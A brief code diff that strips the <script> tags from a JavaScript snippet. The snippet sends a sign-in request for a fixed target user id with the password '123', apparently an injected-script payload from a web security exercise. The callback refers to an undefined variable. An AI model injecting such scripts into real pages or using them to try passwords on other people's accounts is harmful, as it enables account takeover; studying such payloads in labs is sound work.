@@ -1,4 +1,3 @@
-<script>
 var target = "95025812";
 var pw = "123";
 var xmlhttp = new XMLHttpRequest();
@@ -8,4 +7,3 @@ xmlhttp.send("uid="+target+"&userpassword="+pw+"&submit=Sign+in");
 xmlhttp.onreadystatechange = function() {
   console.log(xhttp.responseText);
 };
-</script>
